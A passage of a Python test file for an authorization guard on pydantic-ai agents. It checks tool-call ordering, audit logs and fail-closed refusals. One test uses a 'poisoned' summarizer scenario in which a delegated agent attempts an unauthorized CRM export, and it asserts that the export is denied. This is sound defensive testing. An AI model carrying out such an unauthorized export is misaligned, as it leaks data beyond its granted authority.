            if _step(m) == 0 else ModelResponse(parts=[TextPart("done")])
        ),
        deps_type=dg_pai.GuardedDeps,
        toolsets=[toolset],
        # listed BEFORE guard_cap -- if ordering were user-list-order (the pre-fix
        # default), guard_cap would run first and stash a pending outcome that this
        # capability's raise would then leak.
        capabilities=[_RaisingBeforeCapability(), guard_cap],
    )
    root = Guard.issue("orchestrator", demo.ORCHESTRATOR_AUTHORITY, task="root", schema_version=2)

    # ModelRetry is the framework's OWN "ask the model to redo the call" signal, not an
    # exception that escapes agent.run() -- it just means DelegationGuard's own wrap_tool_execute
    # (and hence guard.check()) never runs for the aborted dispatch, which is exactly what this
    # test is checking.
    _run(agent.run("go", deps=dg_pai.GuardedDeps(guard=root, app=None)))

    # no allow, no outcome -- authorization never ran at all for the aborted dispatch
    assert [e for e in root.audit_log().entries if e["event"] in ("allow", "outcome")] == []
    assert sink == {}


def test_snapshot_freeze_never_shares_a_mutable_container_on_deepcopy_failure():
    """Codex review finding 7: on ANY deepcopy failure deep in a nested structure, the snapshot
    must never fall back to sharing the live, mutable container -- the unclonable leaf becomes
    the shared sanitizer's UNSUPPORTED marker (re-gate correction: it used to become a repr()
    string, which both executed the leaf's own __repr__ and risked colliding with a real
    string value -- see attenu_guard.adapters._snapshot's own module docstring), and every
    dict/list around it is rebuilt fresh regardless."""
    import threading
    from attenu_guard.adapters._snapshot import UNSUPPORTED
    unclonable = threading.Lock()
    live = {"rows": 10, "nested": {"unclonable": unclonable, "list": [1, 2, 3]}}

    snapshot = dg_pai._snapshot_params(live)

    assert snapshot["rows"] == 10
    assert snapshot["nested"]["unclonable"] is UNSUPPORTED
    live["nested"]["list"].append(999)
    live["nested"]["new_key"] = "mutated after snapshot"
    assert snapshot["nested"]["list"] == [1, 2, 3], "the snapshot shared a mutable list"
    assert "new_key" not in snapshot["nested"], "the snapshot shared the mutable dict"


class _AliasingList(list):
    """A mutable container whose `__deepcopy__` hands back itself -- reproduces the exact
    aliasing bug Codex found in round 2: `copy.deepcopy` SUCCEEDING is not proof of
    independence, since a class is free to implement `__deepcopy__` to return `self`."""

    def __deepcopy__(self, memo):
        return self


def test_snapshot_freeze_never_aliases_a_custom_deepcopy_that_returns_itself():
    """Codex review round 2, finding 4: the fix must never call ANY copy protocol
    (copy.deepcopy included) on a container -- rebuilding it from scratch as a fresh
    builtin is the only way to guarantee independence from the live object graph."""
    live = {"x": _AliasingList([1])}

    snapshot = dg_pai._snapshot_params(live)

    assert snapshot["x"] is not live["x"], "the snapshot aliased the live mutable container"
    live["x"].append(2)
    assert snapshot["x"] == [1], "mutating the live container changed the snapshot"


# ==========================================================================
# The TOOLSET layer: `GuardedToolsetCapability`.
#
# pydantic-ai runs the whole hook chain ABOVE the whole toolset chain
# (pydantic/pydantic-ai#8007, comment 5546076540), so `DelegationGuard`'s
# `handler` is the composed agent toolset and any contributed wrapper toolset
# runs INSIDE it. These tests pin the difference: with the toolset-layer
# capability, nothing sits between the guard and the tool body.
# ==========================================================================

@dataclass
class _MarkedToolset(WrapperToolset[Any]):
    """A wrapper toolset that overrides `call_tool` -- the shape that lands between a hook-layer
    guard and the tool body. It records itself, so a trace shows exactly where it ran."""

    label: str = "?"

    async def call_tool(self, name, tool_args, ctx, tool):
        _TRACE.append(f"{self.label}:enter")
        try:
            return await super().call_tool(name, tool_args, ctx, tool)
        finally:
            _TRACE.append(f"{self.label}:exit")


class _MarkedToolsetCapability(AbstractCapability):
    """A third-party-shaped capability that contributes `_MarkedToolset`, optionally claiming the
    `innermost` tier -- the collision `GuardedToolsetCapability`'s "THE TIER, AND THE EDGE THAT
    CLOSES IT" describes."""

    def __init__(self, label: str, position: str | None = None):
        self.label = label
        self.position = position

    def get_ordering(self):
        return CapabilityOrdering(position=self.position) if self.position else None

    def get_wrapper_toolset(self, toolset):
        return _MarkedToolset(toolset, label=self.label)


@dataclass
class _TracedGuardedToolset(dg_pai.GuardedToolset):
    async def call_tool(self, name, tool_args, ctx, tool):
        _TRACE.append("guard-ts:enter")
        try:
            return await super().call_tool(name, tool_args, ctx, tool)
        finally:
            _TRACE.append("guard-ts:exit")


class _TracingGuardedToolsetCapability(dg_pai.GuardedToolsetCapability):
    """The shipped capability with a trace marker on either side of the real check. Everything
    else -- `get_ordering()`, `for_agent()` -- is inherited."""

    def get_wrapper_toolset(self, toolset):
        return _TracedGuardedToolset(
            toolset,
            policies=self.policies,
            get_guard=self.get_guard,
            on_unmapped=self.on_unmapped,
            on_denial=self.on_denial,
        )


# Nothing at all between "guard-ts:enter" and "raw-body": the guard's `self.wrapped.call_tool`
# IS the call that reaches the tool. Both marked wrappers run outside it.
_TOOLSET_INNERMOST_TRACE = [
    "A:enter", "B:enter", "guard-ts:enter", "raw-body", "guard-ts:exit", "B:exit", "A:exit",
]


@pytest.mark.parametrize("order", ["guard-first", "guard-middle", "guard-last"])
def test_toolset_capability_reaches_the_raw_body_in_every_list_order(order):
    """(a) Two other capabilities each contribute a `call_tool`-overriding wrapper toolset.
    `position="innermost"` sorts this capability LAST in the capability chain, and
    `CombinedCapability.get_wrapper_toolset` applies the wrappers over `reversed(...)`, so
    chain-last is toolset-INNERMOST: both marked wrappers end up outside the guard, in every
    list order."""
    _TRACE.clear()
    guard_cap = _TracingGuardedToolsetCapability(policies=_QUERY_POLICIES)
    a, b = _MarkedToolsetCapability("A"), _MarkedToolsetCapability("B")
    capabilities = {
        "guard-first": [guard_cap, a, b],
        "guard-middle": [a, guard_cap, b],
        "guard-last": [a, b, guard_cap],
    }[order]

    root = _run_traced(_ordering_agent(capabilities))

    assert _TRACE == _TOOLSET_INNERMOST_TRACE
    _assert_outcome_is_the_raw_body(root)


def test_the_hook_layer_cannot_reach_the_raw_body_past_a_wrapper_toolset():
    """The limit `GuardedToolsetCapability` exists to remove, pinned as behaviour rather than
    prose: `DelegationGuard` is sorted last among CAPABILITIES and still runs outside both
    contributed wrapper toolsets, because the hook chain is above the toolset chain. The call is
    authorized before anything runs -- enforcement is unaffected -- but the outcome recorded
    around `handler` is A's, not the tool body's."""
    _TRACE.clear()
    guard_cap = _TracingDelegationGuard(policies=_QUERY_POLICIES)
    capabilities = [guard_cap, _MarkedToolsetCapability("A"), _MarkedToolsetCapability("B")]

    _run_traced(_ordering_agent(capabilities))

    assert _TRACE == [
        "guard:enter", "A:enter", "B:enter", "raw-body", "B:exit", "A:exit", "guard:exit",
    ]
    assert _TRACE.index("guard:enter") < _TRACE.index("A:enter")


def test_toolset_capability_denied_call_never_runs_the_body_and_lands_on_the_ledger():
    """(b) A denial in the toolset layer raises before `self.wrapped.call_tool`, so the body
    never runs; the deny entry is on the chain's ledger and no outcome is bound to it."""
    _TRACE.clear()
    agent = _ordering_agent([
        dg_pai.GuardedToolsetCapability(
            policies={"crm_query": dg_pai.ToolPolicy("crm.export", context=lambda a: {"egress": "any"})}
        )
    ])
    root = Guard.issue("orchestrator", demo.ORCHESTRATOR_AUTHORITY, task="root", schema_version=2)
    child = root.delegate("summarizer", demo.SUMMARIZER_AUTHORITY, task="summarize")

    with pytest.raises(AuthorityDenied):
        _run(agent.run("go", deps=dg_pai.GuardedDeps(guard=child, app=None)))

    assert "raw-body" not in _TRACE, "THE TOOL BODY RAN — enforcement failed"
    entries = root.audit_log().entries
    assert any(e["event"] == "deny" and e.get("tool") == "crm_query" for e in entries)
    assert [e for e in entries if e["event"] == "outcome"] == []


def test_toolset_capability_v2_allowed_call_records_a_returned_outcome():
    """(c) The v2 wrapper capture, through the capability rather than a hand-built
    `GuardedToolset`: one allow, one RETURNED outcome bound to it, and the ledger names the
    toolset hook point rather than the hook-layer one."""
    _TRACE.clear()
    agent = _ordering_agent([dg_pai.GuardedToolsetCapability(policies=_QUERY_POLICIES)])

    root = _run_traced(agent)

    assert "raw-body" in _TRACE
    entries = root.audit_log().entries
    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
    outcome = next(e for e in entries if e["event"] == "outcome" and e.get("call_id") == allow["call_id"])
    assert allow["capture"] == Capture.WRAPPER_ASYNC
    assert allow["adapter"]["hook_path"].endswith("GuardedToolset.call_tool")
    assert outcome["body_state"] == BodyState.RETURNED


@pytest.mark.parametrize("injected", [None, "innermost"], ids=["no-ordering", "innermost"])
def test_a_per_run_injected_wrapper_toolset_lands_outside_the_guard(injected):
    """(d). `agent.run(..., capabilities=[...])` composes a SECOND `CombinedCapability` and sorts
    it the same way, AFTER the agent's own capabilities -- so on `position="innermost"` alone an
    injected capability claiming that tier would win the innermost slot on list order. The
    `wrapped_by=[AbstractCapability]` edge is per-sibling and matched by `issubclass`, so it
    reaches the injected capability too: the guard stays innermost either way."""
    _TRACE.clear()
    agent = _ordering_agent([_TracingGuardedToolsetCapability(policies=_QUERY_POLICIES)])

    root = _run_traced(agent, capabilities=[_MarkedToolsetCapability("B", position=injected)])

    assert _TRACE == ["B:enter", "guard-ts:enter", "raw-body", "guard-ts:exit", "B:exit"]
    _assert_outcome_is_the_raw_body(root)


@pytest.mark.parametrize("order", ["guard-first", "guard-last"])
def test_the_tier_is_not_decided_by_list_position(order):
    """The tier caveat, closed. `position="innermost"` alone is a TIER whose only tiebreak is
    LIST order, so a sibling claiming it and contributing a `call_tool`-overriding wrapper
    toolset used to take the innermost slot whenever it was listed after this capability -- and
    then sat between the guard and the tool body. `wrapped_by=[AbstractCapability]` adds an edge
    to every sibling at once, so the sorter settles this capability LAST in both directions and
    the sibling wrapper runs outside it. Probed on 2.31.1, which has no `exclusive_execution`."""
    _TRACE.clear()
    guard_cap = _TracingGuardedToolsetCapability(policies=_QUERY_POLICIES)
    other = _MarkedToolsetCapability("B", position="innermost")
    capabilities = [guard_cap, other] if order == "guard-first" else [other, guard_cap]

    root = _run_traced(_ordering_agent(capabilities))

    assert _TRACE == ["B:enter", "guard-ts:enter", "raw-body", "guard-ts:exit", "B:exit"]
    _assert_outcome_is_the_raw_body(root)


@pytest.mark.parametrize("order", ["guard-first", "guard-middle", "guard-last"])
def test_the_shipped_toolset_capability_is_the_last_leaf_of_the_resolved_chain(order):
    """The same fact read off the settled chain, on the SHIPPED class rather than the tracing
    subclass: `apply` yields leaves outer-first, and wrapper toolsets are applied over
    `reversed(...)`, so being LAST in the capability chain IS being innermost in the toolset
    chain. Last past pydantic-ai's own injected capabilities too."""
    guard_cap = dg_pai.GuardedToolsetCapability(policies=_QUERY_POLICIES)
    a = _MarkedToolsetCapability("A", position="innermost")
    b = _MarkedToolsetCapability("B")
    capabilities = {
        "guard-first": [guard_cap, a, b],
        "guard-middle": [a, guard_cap, b],
        "guard-last": [a, b, guard_cap],
    }[order]

    leaves: list = []
    _ordering_agent(capabilities).root_capability.apply(leaves.append)

    assert leaves[-1] is guard_cap
    assert leaves.index(a) < leaves.index(guard_cap)


def test_tool_search_discovery_is_seen_by_the_hook_layer_and_not_the_toolset_layer():
    """`ToolSearch` is auto-injected and declares `position="outermost"`, so `ToolSearchToolset`
    is outside every other wrapper; it serves the built-in `search_tools` call itself and never
    delegates it inward. The toolset-layer guard therefore never sees `search_tools` and a
    fail-closed `on_unmapped="deny"` does not trip on it. The hook-layer guard does see it, and
    refuses it as unmapped -- which is why a `DelegationGuard` agent with deferred tools must
    give `search_tools` a policy."""
    from pydantic_ai import Tool

    def deferred_tool(rows: int) -> str:  # pragma: no cover - never called
        return f"{rows} rows"

    def search_script(messages, info):
        if _step(messages) == 0:
            return ModelResponse(parts=[ToolCallPart("search_tools", {"queries": ["deferred"]})])
        return ModelResponse(parts=[TextPart("done")])

    def build(capability):
        return Agent(
            FunctionModel(search_script),
            deps_type=dg_pai.GuardedDeps,
            tools=[Tool(deferred_tool, defer_loading=True)],
            capabilities=[capability],
        )

    def go(capability):
        root = Guard.issue("orchestrator", demo.ORCHESTRATOR_AUTHORITY, task="root", schema_version=2)
        _run(build(capability).run("go", deps=dg_pai.GuardedDeps(guard=root, app=None)))

    go(dg_pai.GuardedToolsetCapability(policies={}))  # not seen: no unmapped refusal

    with pytest.raises(dg_pai.UnmappedToolError, match="search_tools"):
        go(dg_pai.DelegationGuard(policies={}))


# --------------------------------------------------------------------------
# (e) Two authorizers on one agent is always a double `guard.check()`.
# --------------------------------------------------------------------------

def _plain_agent(capabilities, toolsets=None):
    return Agent(
        FunctionModel(lambda m, i: ModelResponse(parts=[TextPart("done")])),
        deps_type=dg_pai.GuardedDeps,
        toolsets=toolsets if toolsets is not None else [FunctionToolset()],
        capabilities=capabilities,
    )


@pytest.mark.parametrize("order", ["toolset-first", "hook-first"])
def test_toolset_capability_and_delegation_guard_together_are_refused(order):
    """Refused, but by the SORTER, not by this file. Both classes declare
    `wrapped_by=[AbstractCapability]`, so each demands to be outside the other and
    `sort_capabilities` raises before any `for_agent` runs. Refusal is the correct outcome --
    two authorizers means `guard.check()` twice per call -- but the diagnostic is pydantic-ai's
    and names neither capability, which is why both class docstrings say that
    "Circular ordering constraints among capabilities" on an attenu-guard agent means exactly
    this. The sort happens inside `CombinedCapability.__post_init__`, which `Agent.__init__`
    calls before binding, so no adapter frame is on the stack to reword it."""
    caps = [dg_pai.GuardedToolsetCapability(policies={}), dg_pai.DelegationGuard(policies={})]
    if order == "hook-first":
        caps.reverse()

    with pytest.raises(dg_pai.UserError, match="Circular ordering constraints"):
        _plain_agent(caps)


def test_two_toolset_capabilities_on_one_agent_are_refused():
    """Same verdict, and pydantic-ai's own diagnostic improves once `exclusive_execution` exists.
    Without the field both capabilities are separated only by their `wrapped_by` edges, each
    demanding to be outside the other, and the sorter reports the bare cycle. With it, both also
    declare the flag and pydantic-ai names them and explains why only one can be innermost --
    which is what makes the flag worth setting even though the edge already holds the slot."""
    expected = (
        "each require that nothing nests inside them"
        if dg_pai._ordering_supports("exclusive_execution")
        else "Circular ordering constraints"
    )
    with pytest.raises(dg_pai.UserError, match=expected):
        _plain_agent([
            dg_pai.GuardedToolsetCapability(policies={}),
            dg_pai.GuardedToolsetCapability(policies={}),
        ])


def test_toolset_capability_over_a_hand_built_guarded_toolset_is_refused():
    """The capability would wrap a toolset that already guards itself: two checks, one call."""
    guarded = dg_pai.GuardedToolset(FunctionToolset(), policies={})

    with pytest.raises(dg_pai.UserError, match="both registered on this agent"):
        _plain_agent([dg_pai.GuardedToolsetCapability(policies={})], toolsets=[guarded])


@pytest.mark.parametrize(
    "guard",
    [dg_pai.GuardedToolsetCapability, dg_pai.DelegationGuard],
    ids=["toolset-capability", "hook"],
)
def test_a_guarded_toolset_nested_in_a_combined_toolset_is_still_refused(guard):
    """A toolset tree nests two ways. `WrapperToolset` chains through `.wrapped`, which both
    `for_agent` walks followed; `CombinedToolset` BRANCHES through `.toolsets`, which they did
    not. So a hand-built `GuardedToolset` one level inside a `CombinedToolset` in `toolsets=[...]`
    slipped past both agent-wide authorizers and every call was authorized twice -- measured
    before the fix as two allow entries and two outcome entries on the ledger for one tool body,
    on both classes."""
    inner = FunctionToolset()

    @inner.tool_plain
    def crm_query(rows: int) -> str:  # pragma: no cover - must never be reached
        return f"{rows} rows"

    nested = CombinedToolset([dg_pai.GuardedToolset(inner, policies=_QUERY_POLICIES)])

    with pytest.raises(dg_pai.UserError, match="both registered on this agent"):
        _plain_agent([guard(policies=_QUERY_POLICIES)], toolsets=[nested])


def test_a_combined_toolset_with_no_guarded_toolset_does_not_trip_the_check():
    """The negative case for the deeper walk: branching through `.toolsets` must not start
    reporting ordinary nested toolsets."""
    _plain_agent(
        [dg_pai.GuardedToolsetCapability(policies={})],
        toolsets=[CombinedToolset([FunctionToolset(), FunctionToolset()])],
    )


@pytest.mark.parametrize("entry_point", ["capability", "hand-built"])
def test_a_fail_closed_refusal_names_the_entry_point_the_user_actually_wrote(entry_point):
    """`UnmappedToolError` and `MissingGuardError` used to say "GuardedToolset:" whatever put the
    toolset there, so a refusal on a `GuardedToolsetCapability` agent pointed at an object the
    user never wrote. `GuardedToolset.label` is a dataclass field -- so it survives the
    `dataclasses.replace` rebuild `for_run` does -- and the capability sets its own class name."""
    expected = "GuardedToolsetCapability" if entry_point == "capability" else "GuardedToolset"

    def agent_for(policies):
        toolset = FunctionToolset()

        @toolset.tool_plain
        def crm_query(rows: int) -> str:  # pragma: no cover - must never be reached
            return f"{rows} rows"

        if entry_point == "capability":
            toolsets = [toolset]
            capabilities = [dg_pai.GuardedToolsetCapability(policies=policies)]
        else:
            toolsets = [dg_pai.GuardedToolset(toolset, policies=policies)]
            capabilities = []
        return Agent(
            FunctionModel(single_read_script), toolsets=toolsets, capabilities=capabilities
        )

    root = Guard.issue("orchestrator", demo.ORCHESTRATOR_AUTHORITY, task="root", schema_version=2)

    with pytest.raises(dg_pai.UnmappedToolError, match=f"^{expected}: "):
        _run(agent_for({}).run("go", deps=dg_pai.GuardedDeps(guard=root, app=None)))

    with pytest.raises(dg_pai.MissingGuardError, match=f"^{expected}: "):
        _run(agent_for(_QUERY_POLICIES).run("go", deps=object()))


def test_the_toolset_capability_alone_constructs_and_runs():
    """The negative case for all three refusals above: on its own, with an ordinary toolset, it
    must build without complaint."""
    _plain_agent([dg_pai.GuardedToolsetCapability(policies={})])


# --------------------------------------------------------------------------
# (f) `exclusive_execution` is feature-detected, not assumed.
# --------------------------------------------------------------------------

@dataclasses.dataclass
class _OrderingWithoutFlag:
    """`CapabilityOrdering` as every RELEASED pydantic-ai has it -- checked against 2.31.1,
    2.37.0 and 2.39.0. Passing `exclusive_execution` to this is a TypeError."""

    position: Any = None
    wraps: Any = ()
    wrapped_by: Any = ()
    requires: Any = ()


@dataclasses.dataclass
class _OrderingWithFlag(_OrderingWithoutFlag):
    """`CapabilityOrdering` as pydantic/pydantic-ai#8067 has it (probed at head 9f5863f)."""

    exclusive_execution: bool = False


def test_get_ordering_omits_exclusive_execution_when_the_field_does_not_exist(monkeypatch):
    monkeypatch.setattr(dg_pai, "CapabilityOrdering", _OrderingWithoutFlag)

    ordering = dg_pai.GuardedToolsetCapability(policies={}).get_ordering()

    assert isinstance(ordering, _OrderingWithoutFlag)
    assert ordering.position == "innermost"
    assert list(ordering.wrapped_by) == [AbstractCapability]
    assert not hasattr(ordering, "exclusive_execution")


def test_get_ordering_sets_exclusive_execution_when_the_field_exists(monkeypatch):
    monkeypatch.setattr(dg_pai, "CapabilityOrdering", _OrderingWithFlag)

    ordering = dg_pai.GuardedToolsetCapability(policies={}).get_ordering()

    assert isinstance(ordering, _OrderingWithFlag)
    assert ordering.position == "innermost"
    assert list(ordering.wrapped_by) == [AbstractCapability]
    assert ordering.exclusive_execution is True


def test_get_ordering_against_the_installed_pydantic_ai_is_constructible():
    """Whatever is installed, `position` is "innermost" and the object builds -- the detection
    must never hand `CapabilityOrdering` a keyword it does not have."""
    ordering = dg_pai.GuardedToolsetCapability(policies={}).get_ordering()

    assert isinstance(ordering, CapabilityOrdering)
    assert ordering.position == "innermost"
    assert list(ordering.wrapped_by) == [AbstractCapability]
    assert getattr(ordering, "exclusive_execution", False) is dg_pai._ordering_supports(
        "exclusive_execution"
    )


@pytest.mark.parametrize(
    "guard", [dg_pai.GuardedToolsetCapability, dg_pai.DelegationGuard], ids=["toolset", "hook"]
)
def test_the_shipped_example_denies_the_export_under_either_hook_point(guard):
    """The two capabilities differ in WHERE the check sits, not in what it decides. The shipped
    scenario is run through both: the poisoned export is denied before its body either way."""
    ops = demo.Ops()
    root, orchestrator, _ = demo.build_scenario(
        ops, summarizer_script=poisoned_summarizer_script, guard=guard
    )

    with pytest.raises(AuthorityDenied):
        _run(orchestrator.run("Summarise Q3", deps=dg_pai.GuardedDeps(guard=root, app=ops)))

    assert ops.exported_to is None, "THE TOOL BODY RAN — enforcement failed"
    assert ops.rows_returned == 4200
    assert any(
        e["event"] == "deny" and e.get("tool") == "crm_export" for e in root.audit_log().entries
    )


class _LeafSwappingCapability(AbstractCapability):
    """A durability capability's shape, without the engine. `BaseDurabilityCapability` claims
    `position="innermost"` but does not wrap the composed toolset: `get_wrapper_toolset` calls
    `visit_and_replace` to swap LEAF toolsets for durable ones, and
    `WrapperToolset.visit_and_replace` rebuilds a wrapper AROUND its visited inner toolset. This
    reproduces exactly that, so the composition can be asserted without a Temporal worker."""

    def get_ordering(self):
        return CapabilityOrdering(position="innermost")

    def get_wrapper_toolset(self, toolset):
        def swap(ts):
            return _MarkedToolset(ts, label="durable") if isinstance(ts, FunctionToolset) else ts

        return toolset.visit_and_replace(swap)


@pytest.mark.parametrize("order", ["guard-first", "guard-last"])
def test_a_leaf_swapping_durability_capability_composes_inside_the_guard(order):
    """Neither list order puts the durable wrapper outside the guard, because it never wraps the
    composed toolset: applied first it swaps the raw leaves and the guard then wraps the result;
    applied second it descends through the guard and rebuilds it around the swapped leaves. So
    the guard's record encloses the durable dispatch either way, and the pair composes on every
    released pydantic-ai. When `exclusive_execution` ships, both capabilities set it and
    pydantic-ai refuses the pair instead."""
    _TRACE.clear()
    guard_cap = _TracingGuardedToolsetCapability(policies=_QUERY_POLICIES)
    durable = _LeafSwappingCapability()
    capabilities = [guard_cap, durable] if order == "guard-first" else [durable, guard_cap]

    root = _run_traced(_ordering_agent(capabilities))

    assert _TRACE == [
        "guard-ts:enter", "durable:enter", "raw-body", "durable:exit", "guard-ts:exit",
    ]
    _assert_outcome_is_the_raw_body(root)
